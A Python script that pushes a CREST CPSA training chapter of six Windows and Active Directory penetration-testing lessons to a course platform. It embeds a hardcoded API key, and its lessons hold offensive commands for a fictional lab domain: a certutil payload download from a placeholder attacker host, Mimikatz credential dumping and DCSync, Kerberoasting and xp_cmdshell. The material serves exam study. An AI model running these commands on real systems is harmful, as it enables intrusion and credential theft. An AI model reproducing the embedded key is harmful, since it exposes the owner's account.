"""
Module E - CourseStack Push Script
Builds the full Module E chapter + 6 lessons in the CPSA course.

Run on Windows:
    python push_module_e_coursestack.py

Or pull direct from GitHub:
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/heaps1345/mca-activites/main/scripts/push_module_e_coursestack.py" -OutFile "push_module_e_coursestack.py"
    python push_module_e_coursestack.py
"""

import requests
from requests.auth import HTTPBasicAuth
import json
import uuid
import time

API_KEY   = "sk_5e9fde21e45324530a735286f8e28bcecf3e9df298ab37ec016833ed57c4f2e52b215010e457e6f3de80c070d3161ff5"
BASE      = "https://app.coursestack.com"
COURSE_ID = "32dd022a-61bb-4105-be92-71a46eadf98d"
auth      = HTTPBasicAuth(API_KEY, "")
GITHUB    = "https://heaps1345.github.io/mca-activites/cpsa/module-e"

LABS = [
    {
        "name": "Lab E1-A: SMB Enumeration",
        "url":  f"{GITHUB}/lab-e1a-smb-enumeration-v1.html",
        "theory": """## SMB Enumeration

SMB (Server Message Block) is one of the most valuable attack surfaces in Windows environments. It exposes shares, user accounts, OS version, signing configuration, and often provides unauthenticated access to sensitive data.

### Key Tools
- **Nmap** - SMB version detection and signing scripts
- **enum4linux-ng** - Comprehensive null session enumeration
- **smbclient** - Interactive share browsing
- **smbmap** - Automated share permission mapping
- **CrackMapExec** - Authenticated domain enumeration

### Why SMB Signing Matters
When SMB signing is **not required**, you can relay captured NTLM hashes directly to other hosts without cracking them first. This is checked with:
```
nmap --script smb-security-mode -p 445 <target>
```

### CREST CPSA Focus
- Null sessions (anonymous access) are a HIGH finding
- Credentials found in shares are a CRITICAL finding
- SMB signing disabled = relay attack possible = escalate severity of any captured hash

> ★ **Exam point:** Know the difference between SMB signing *disabled*, *not required*, and *required* - each has different security implications.
"""
    },
    {
        "name": "Lab E2-A: Credential Access",
        "url":  f"{GITHUB}/lab-e2a-credential-access-v1.html",
        "theory": """## Credential Access - Responder and Pass-the-Hash

LLMNR and NBT-NS are legacy Windows name resolution protocols that broadcast queries to the local network when DNS fails. Responder poisons these broadcasts to capture NetNTLMv2 hashes.

### Attack Flow
1. A Windows host sends an LLMNR/NBT-NS broadcast for an unresolvable name
2. Responder answers: "That's me - authenticate to me"
3. Windows authenticates, sending a NetNTLMv2 challenge-response hash
4. Hash is saved to `/usr/share/responder/logs/`

### Hash Types - Critical Distinction
| Hash | Hashcat Mode | Can Pass? | Must Crack? |
|------|-------------|-----------|-------------|
| NetNTLMv2 | 5600 | ❌ No | ✅ Yes (or relay) |
| NT Hash | 1000 | ✅ Yes (PTH) | Optional |

### NTLM Relay Alternative
If you can't crack the hash, relay it with `ntlmrelayx.py` to another host where the victim has admin rights. Disable SMB and HTTP in `/etc/responder/Responder.conf` first.

> ★ **Exam point:** NetNTLMv2 **cannot** be passed directly. You must either crack it with Hashcat (mode 5600) or relay it with ntlmrelayx.py. NT hashes (from Mimikatz/secretsdump) **can** be passed with Evil-WinRM `-H` or CrackMapExec.
"""
    },
    {
        "name": "Lab E3-A: Windows Privilege Escalation",
        "url":  f"{GITHUB}/lab-e3a-windows-privesc-v1.html",
        "theory": """## Windows Privilege Escalation

After gaining an initial foothold as a low-privileged user, privilege escalation finds misconfigurations that allow elevation to SYSTEM or Administrator.

### WinPEAS
WinPEAS is the go-to automated enumeration tool. Transfer it with:
```
certutil -urlcache -split -f http://<KALI-IP>/winpeas.exe winpeas.exe
```

### Key Escalation Paths in Syntex Environment
| Vulnerability | Service/Location | Technique |
|--------------|-----------------|-----------|
| Unquoted Service Path | SyntexBackup | Place Syntex.exe in writable parent dir |
| AlwaysInstallElevated | Registry (both hives) | msfvenom MSI payload |
| Weak ACL Service | SyntexMonitor | Replace binary |
| Scheduled Task Script | C:\\Scripts\\maintenance.ps1 | Overwrite with reverse shell |

### After SYSTEM
Once you have SYSTEM on the DC, immediately run Mimikatz:
```
sekurlsa::logonpasswords
lsadump::dcsync /domain:syntex.local /all
```

> ★ **Exam point:** AlwaysInstallElevated requires **both** HKCU and HKLM registry keys set to 1. If only one is set, the attack doesn't work.
"""
    },
    {
        "name": "Lab E4-A: Active Directory Enumeration",
        "url":  f"{GITHUB}/lab-e4a-ad-enumeration-v1.html",
        "theory": """## Active Directory Enumeration

With a valid domain credential, you can query the entire AD structure via LDAP. The goal is to map the attack path to Domain Admin.

### LDAP Enumeration
```bash
# All users with descriptions (often contain passwords)
ldapsearch -x -H ldap://<DC-IP> -D "svc-backup@syntex.local" -w Password1 \
  -b "DC=syntex,DC=local" "(objectClass=user)" sAMAccountName description
```

### BloodHound
BloodHound visualises AD attack paths using graph theory. It shows:
- **Shortest Path to Domain Admins** - always run this first
- **HasSession edges** - where DA accounts are logged in (dump creds there)
- **Kerberoastable accounts** - accounts with SPNs
- **DCSync rights** - accounts that can dump all hashes

### Collection Methods
**From Kali (preferred - no AV risk):**
```bash
bloodhound-python -u svc-backup -p Password1 -d syntex.local -ns <DC-IP> -c All
```

**From target (if needed):**
```powershell
.\SharpHound.exe -c All
```

> ★ **Exam point:** "Shortest Paths to Domain Admins" is always the first BloodHound query. HasSession edges are the most operationally valuable - they show where to find DA credentials already in memory.
"""
    },
    {
        "name": "Lab E5-A: Kerberos Attacks",
        "url":  f"{GITHUB}/lab-e5a-kerberos-attacks-v1.html",
        "theory": """## Kerberos Attacks - Kerberoasting and AS-REP Roasting

Two distinct attacks exploit Kerberos to obtain offline-crackable hashes.

### Comparison

| Property | Kerberoasting | AS-REP Roasting |
|----------|--------------|-----------------|
| Credentials required? | Yes (any domain user) | No |
| AD condition | Account has SPN set | Pre-authentication disabled |
| Hashcat mode | 13100 | 18200 |
| Tool | GetUserSPNs.py | GetNPUsers.py |

### Kerberoasting
```bash
GetUserSPNs.py syntex.local/svc-backup:Password1 -dc-ip <DC-IP> -request -outputfile kerberoast.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
```

### AS-REP Roasting (no credentials needed)
```bash
GetNPUsers.py syntex.local/ -usersfile users.txt -dc-ip <DC-IP> -no-pass -format hashcat -outputfile asrep.txt
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

> ★ **Exam point:** AS-REP Roasting needs NO credentials - try it first when you have zero domain access. Hashcat mode 13100 = Kerberoasting, 18200 = AS-REP Roasting. Memorise both.
"""
    },
    {
        "name": "Lab E6-A: SQL Server Exploitation",
        "url":  f"{GITHUB}/lab-e6a-sql-exploitation-v1.html",
        "theory": """## SQL Server Exploitation - xp_cmdshell and Data Extraction

SQL Server with a weak sa password provides direct OS command execution via xp_cmdshell.

### Discovery
```bash
nmap -p 1433 -sV --script ms-sql-info,ms-sql-config <target>
crackmapexec mssql <target> -u sa -p Syntex2024!
```

### Connect and Enable xp_cmdshell
```bash
mssqlclient.py sa:Syntex2024! @<DC-IP>
```
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

### SeImpersonatePrivilege
The SQL Server service account has SeImpersonatePrivilege. This allows escalation to SYSTEM via PrintSpoofer or GodPotato - then dump all AD hashes with secretsdump.py.

### PCI DSS Findings
- CustomerCards table contains PAN, CVV, expiry in plaintext - PCI DSS v4.0 Req 3.3 violation
- CVV must **never** be stored post-authorisation
- InternalCredentials table exposes domain admin password

> ★ **Exam point:** SQL Server = port 1433. xp_cmdshell requires sysadmin role. SeImpersonatePrivilege on a service account = SYSTEM via Potato exploit. Always mask PAN to first 6 + last 4 digits in reports.
"""
    },
]


def post(endpoint, payload):
    r = requests.post(f"{BASE}{endpoint}", auth=auth, json=payload, timeout=15)
    if r.status_code not in (200, 201):
        print(f"  ERROR {r.status_code}: {r.text[:200]}")
        return None
    return r.json()


def create_lesson_with_content(chapter_id, name, theory_md, lab_url):
    lesson_id = str(uuid.uuid4())
    content_id = str(uuid.uuid4())
    text_id    = str(uuid.uuid4())
    iframe_id  = str(uuid.uuid4())

    # Step 1 - create shell
    print(f"  Creating lesson shell: {name}")
    result = post(f"/api/content/{COURSE_ID}/lessons", {
        "chapter_id": chapter_id,
        "name": name,
        "type": "lesson"
    })
    if not result:
        return None
    real_id = result.get("id") or result.get("lesson", {}).get("id") or lesson_id

    time.sleep(0.5)

    # Step 2 - push content
    print(f"  Pushing content to: {real_id}")
    result2 = post(f"/api/content/{COURSE_ID}/lessons/{real_id}", {
        "content": {
            "type": "lesson",
            "id": content_id,
            "items": [
                {
                    "id": text_id,
                    "type": "text",
                    "markdown": theory_md
                },
                {
                    "id": iframe_id,
                    "type": "iframe",
                    "url": lab_url,
                    "aspect_height": 9,
                    "aspect_width": 16
                }
            ]
        }
    })
    if result2:
        print(f"  ✓ Done: {name}")
    return real_id


def main():
    print("=== Module E - CourseStack Push ===")
    print(f"Course: {COURSE_ID}")
    print()

    # Create the Module E chapter
    print("Creating chapter: Module E - Windows Security Assessment")
    ch = post(f"/api/content/{COURSE_ID}/chapters", {
        "name": "Module E - Windows Security Assessment",
        "type": "chapter"
    })
    if not ch:
        print("FAILED to create chapter - check API key / course ID")
        return

    chapter_id = ch.get("id") or ch.get("chapter", {}).get("id")
    print(f"  Chapter ID: {chapter_id}")
    print()

    # Create each lesson
    for lab in LABS:
        create_lesson_with_content(
            chapter_id=chapter_id,
            name=lab["name"],
            theory_md=lab["theory"],
            lab_url=lab["url"]
        )
        time.sleep(1)

    print()
    print("=== Complete ===")
    print("Module E is now in CourseStack.")
    print(f"Check: https://app.coursestack.com (course: CREST CPSA)")


if __name__ == "__main__":
    main()
